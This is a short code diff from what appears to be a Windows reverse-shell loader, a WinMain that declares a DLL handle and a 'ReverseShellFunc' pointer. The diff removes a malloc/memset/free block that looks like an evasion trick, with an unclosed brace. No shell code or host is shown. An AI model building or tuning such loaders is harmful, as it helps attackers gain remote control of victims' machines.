@@ -53,12 +53,6 @@ typedef void (*ReverseShellFunc)();
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
 
-    char *mem = NULL;
-    mem = (char *) malloc(1000000);
-    if (mem != NULL) {
-    memset(mem, 00, 10000);
-    free(mem);
-
     HINSTANCE hDLL;
     ReverseShellFunc reverseShell;
 
